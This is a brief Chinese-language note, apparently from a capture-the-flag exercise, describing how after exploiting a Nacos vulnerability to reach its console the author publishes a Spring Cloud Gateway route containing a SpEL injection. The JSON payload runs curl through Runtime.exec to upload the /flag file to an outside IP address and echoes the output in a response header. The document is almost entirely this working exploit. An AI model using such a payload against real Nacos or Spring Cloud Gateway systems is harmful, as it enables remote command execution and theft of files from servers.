利用nacos漏洞进入后台后，发现gateway配置文档，修改发布，进行spel注入命令执行。下面是json格式。
```
{
    "spring": {
        "cloud": {
            "gateway": {
                "routes": [
                    {
                        "id": "whocansee",
                        "order": 0,
                        "uri": "lb://backendservice",
                        "predicates": [
                            "Path=/echo/**"
                        ],
                        "filters": [
                            {
                                "name": "AddResponseHeader",
                                "args": {
                                    "name": "result",
                                    "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'curl','http://47.113.202.32:23233','-T','/flag'}).getInputStream())).replaceAll('\n','').replaceAll('\r','')}"
                                }
                            }
                        ]
                    }
                ]
            }
        }
    }
}
```

